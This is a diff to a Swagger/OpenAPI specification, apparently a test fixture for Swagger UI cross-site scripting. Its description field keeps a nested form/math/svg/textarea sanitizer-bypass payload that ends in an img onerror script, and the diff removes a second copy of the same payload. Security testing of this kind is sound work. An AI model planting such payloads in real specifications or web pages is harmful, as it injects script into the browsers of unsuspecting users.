@@ -5,7 +5,7 @@ info:
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)>"></form>
 
   version: foo
-basePath: /JSSResource/
+basePath: /Path/
 produces:
   - application/xml
   - application/json
@@ -24,8 +24,3 @@ paths:
         - XSS_Swagger-UI
       operationId: findAccounts
       summary: Finds all accounts
-  '/accounts/groupid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)>"></form>
